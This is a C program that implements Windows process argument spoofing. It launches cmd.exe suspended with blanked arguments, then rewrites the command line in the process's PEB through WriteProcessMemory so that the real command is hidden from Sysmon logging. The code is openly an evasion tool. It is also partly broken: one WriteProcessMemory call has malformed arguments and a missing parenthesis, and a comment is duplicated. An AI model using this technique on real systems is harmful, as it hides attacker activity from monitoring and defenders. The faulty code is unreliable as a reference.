#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>

void replaceArguementsWithSpaces(const char *original, char *modified) {
    const char *firstSpace = strchr(original, ' ');
    if (firstSpace != NULL) {
        size_t length = firstSpace - original + 1;
        strncpy(modified, original, length);
        memset(modified + length, ' ', strlen(original) - length);
        modified[strlen(original)] = '\0';
    } else {
        strcpy(modified, original);
    }
}

int main() {
    BOOL status = FALSE;
    const char *lolBinCommand = "cmd.exe /k echo This will not be logged in sysmon test";

    // Create spoofed cmdline
    char spoofedCmdline[MAX_PATH];
    replaceArguementsWithSpaces(lolBinCommand, spoofedCmdline);

    // Convert realCmdline to wide character string
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, NULL, 0);
    wchar_t *realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, realCmdlineW, realCmdlineLen);

    // Convert realCmdline to wide character string
    int spoofedCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, NULL, 0);
    wchar_t *spoofedCmdlineW = (wchar_t *)malloc(spoofedCmdlineLen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);

    // Create suspended process
    printf("[+] Creating the process suspended\n");
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
        goto cleanup;
    }

    // Get PROCESS_BASIC_INFORMATION structure
    printf("[+] Reading the PROCESS_BASIC_INFORMATION structure\n");
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ret;
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
        goto cleanup;
    }
    printf("[+] PEB base address: %p\n", pbi.PebBaseAddress);

    // Get PEB structure
    printf("[+] Reading the PEB structure\n");
    PEB peb;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        goto cleanup;
    }
    printf("[+] Process parameters address: %p\n", peb.ProcessParameters);

    // Get RTL_USER_PROCESS_PARAMETERS structure
    printf("[+] Reading the RTL_USER_PROCESS_PARAMETERS structure\n");
    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
        goto cleanup;
    }
    printf("[+] Command line address: %p\n", procParams.CommandLine.Buffer);

    // Change command line
    if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
        goto cleanup;
    }

    // Change command line
    if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Length, 7, 4) {
        goto cleanup;
    }

    // Resume process
    printf("[+] Resuming the main thread\n");
    ResumeThread(pi.hThread);
    
    return TRUE;
cleanup:
    free(realCmdlineW);
    return status;
}
